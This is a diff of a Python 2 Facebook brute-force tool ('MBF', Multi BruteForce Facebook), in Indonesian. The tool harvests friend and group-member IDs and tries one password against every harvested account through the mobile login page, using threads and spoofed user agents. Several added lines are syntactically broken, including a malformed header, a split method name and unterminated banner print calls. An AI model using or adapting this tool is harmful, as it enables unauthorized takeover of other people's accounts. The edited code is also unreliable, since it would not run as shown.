@@ -11,13 +11,13 @@ def cetak(x,e=0):
 	else:
 		sys.stdout.write(x+'\n')
 if platform.python_version().split('.')[0] != '2':
-	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
+	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2'%v().split(' ')[0])
 	sys.exit()
 import cookielib,re,urllib2,urllib,threading
 try:
   import mechanize
 except ImportError:
-	cetak('!m[!] SepertiNya module !cMechanize!m belum di install...\n!h[!] pip2 install mechanize')
+	cetak('!m[!] Sepertinya module !cMechanize!m belum di install...\n!h[!] pip2 install mechanize')
 	sys.exit()
 br = 0
 log = 0
@@ -35,7 +35,8 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://mbasic.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+			data = urllib2.urlopen(urllib2.Request(url='https://mbasic.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
 		except KeyboardInterrupt:
 			sys.exit()
 		except:
@@ -51,7 +52,7 @@ def crack(d):
 	while 1:
 		s = inputD('[?] Sandi')
 		if len(s) < 6:
-			cetak('!m[!] Jumlah Sandi Minimal !k6')
+			cetak('!m[!] Jumlah huruf minimal !k6')
 		else:
 			break
 	return crack0(d,s)
@@ -83,7 +84,7 @@ def tampilhasil(akun,sandi,data):
 		return menu()
 def crack0(data,sandi):
 	akun = []
-	cetak('!h[*] Mengcrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
+	cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
 	cetak('!h[*] Cracking  !k0!m%',1)
 	sys.stdout.flush()
 	jml0,jml1 = 0,0
@@ -129,13 +130,14 @@ def crack0(data,sandi):
 def install_browser():
 	global br
 	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
 	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
 	br.set_handle_equiv(True)
 	br.set_handle_referer(True)
-	br.set_cookiejar(cookielib.LWPCookieJar())
-	br.set_handle_redirect(True)
-	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-	br.addheaders = [('User-Agent','Opera/10.00 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.2.0 Version/12.16')]
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -174,7 +176,7 @@ def inputD(x,v=0):
 			if a.upper() in v:
 				break
 			else:
-				cetak('!m[!] Masukan Opsinya kak!')
+				cetak('!m[!] Masukan Opsinya kak...')
 				continue
 		else:
 			if len(a) == 0:
@@ -231,7 +233,7 @@ def login():
 	global log
 	us = inputD('[?] Email/HP')
 	pa = inputD('[?] Kata Sandi')
-	cetak('!h[*] Sedang Login!...')
+	cetak('!h[*] Sedang Login....')
 	buka('https://mbasic.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -246,13 +248,13 @@ def login():
 		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
 		log = 1
 	elif 'checkpoint' in url:
-		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba login dengan opera mini')
+		cetak('!m[!] Akun anda terkena checkpoint!\n!k[!] Coba Login dengan browser anda')
 		keluar()
 	else:
 		cetak('!m[!] Login Gagal')
 def idgroup():
 	if log != 1:
-		cetak('!h[*] Login !bFacebook!h dahulu...')
+		cetak('!h[*] Login !bFB!h dulu bos...')
 		login()
 		if log == 0:
 			keluar()
@@ -286,7 +288,8 @@ def idteman():
 	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
 	saring_id_teman(buka('https://mbasic.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
 	try:
-		next = br.find_link(url_regex='friends_center_main').url
+		next = br.find_lin
+		k(url_regex='friends_center_main').url
 	except:
 		if len(id_teman) != 0:
 			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
@@ -309,7 +312,16 @@ def idteman():
 	else:
 		return menu()
 def menu():
-	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !cv2.5!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cDzakira Alzena Daiva\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
+	cetak("\e[1;34m   _  _    _____                   _                  _      \n\e[0m"
+	cetak("\e[1;34m _| || |_ |  ___|                 | |                | |     \n\e[0m"
+	cetak("\e[1;34m|_  __  _|| |_   __ _   ___   ___ | |__    __ _  ___ | |__   \n\e[0m"
+	cetak("\e[1;34  _| || |_ |  _| / _\` | / __| / _ \|  _ \  / _\` |/ __||  _ \  \n\e[0m"
+	cetak("\e[1;77m|_  __  _|| |  | (_| || (__ |  __/| |_) || (_| |\__ \| | | | \n\e[0m"
+	cetak("\e[1;77m  |_||_|  \_|   \__,_| \___| \___||_.__/  \__,_||___/|_| |_| \n\e[0m"
+	cetak("\e[1;104m                       AMBIL ID DARI?...     \e[0m\n"
+	cetak("\e[1;41m      1. DAFTAR TEMAN   2. ANGGOTA GROUP   3. KELUAR\e[0m\n"
+	cetak("\n
+	
 	i = inputM('[?] PILIH',[1,2,3])
 	if i == 2:
 		lanjutG()
